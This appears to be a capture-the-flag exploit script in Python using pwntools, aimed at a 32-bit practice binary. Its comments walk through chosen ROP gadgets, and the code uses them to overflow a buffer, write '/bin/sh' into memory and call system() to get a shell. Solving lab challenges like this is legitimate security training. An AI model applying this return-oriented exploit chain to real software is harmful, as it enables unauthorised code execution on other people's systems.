from pwn import *
## Write /bin/sh to address
###Possible useful gadgets
# 0x08048693: mov dword ptr [ecx], edx; pop ebp; pop ebx; xor byte ptr [ecx], bl; ret;
# To achieve
# set edx == our string
# set ecx == address

## XOR with 2 same values will return 0 so xor edx,edx will return 0 into edx.

#0x08048671: xor edx, edx; pop esi; mov ebp, 0xcafebabe; ret;

## AS edx is 0 so if we able to put our string in ebx and later xoring it with edx will
##transfer the data to edx

#0x0804867b: xor edx, ebx; pop ebp; mov edi, 0xdeadbabe; ret;

#pop ebx

#0x080483e1: pop ebx; ret;

## exchange the values of ecx and edx to set ecx to some address

#0x08048689: xchg edx, ecx; pop ebp; mov edx, 0xdefaced0; ret;
## make edx == address
## make ecx == string

system = 0x8048430
space = 0x0804a028 + 64

exp = "A" * 44

def write(string,offset):
    #setting edx to our string
    payload = ""
    payload += p32(0x08048671)
    payload += "JUNK"
    payload += p32(0x080483e1)
    payload += offset
    payload += p32(0x0804867b)
    payload += "JUNK" #edx == address
    payload += p32(0x08048689)
    payload += "JUNK" ##ecx is now address
    payload += p32(0x08048671)
    payload += "JUNK"
    payload += p32(0x080483e1)
    payload += string
    payload += p32(0x0804867b)
    payload += "JUNK" ###edx == string
    payload += p32(0x08048693)
    payload += "JUNK"
    payload += p32(0x00000000)
    return payload


exp += write("/bin",p32(space))
exp += write("/sh\x00",p32(space+4))

exp += p32(system)
exp += "AAAA"
exp += p32(space)

print exp
